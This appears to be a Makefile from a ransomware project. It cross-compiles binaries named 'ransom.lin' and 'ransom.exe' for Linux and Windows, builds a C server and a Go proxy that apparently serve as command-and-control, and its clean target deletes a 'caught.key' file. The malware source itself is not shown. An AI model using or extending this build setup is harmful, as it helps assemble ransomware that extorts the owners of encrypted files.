out 	 = bin
lib 	 = src
winlib 	 = $(lib)/libwin.c -lwsock32
linlib 	 = $(lib)/liblin.c
comlib 	 = $(lib)/libcom.c
serv	 = serv/server.c
proxy	 = serv/proxy.go

all: linux windows

linux:
	gcc -o $(out)/ransom.lin -Wall main.c $(linlib) $(comlib)
	@echo done !

windows:
	x86_64-w64-mingw32-gcc -O3 -o $(out)/ransom.exe -Wall main.c $(winlib) $(comlib)
	@echo done !

server:
	@gcc -o $(out)/server.lin -Wall $(serv)
	@go build -o $(out)/proxy.lin $(proxy)
	@GOOS=windows go build -o $(out)/proxy.win $(proxy)
	@echo done !
run:
	@echo listening...
	@./$(out)/server.lin &
	@./bin/proxy.lin &

clean:
	rm -rf $(out)/*
	rm readme
	rm caught.key
	@echo projet cleaned !
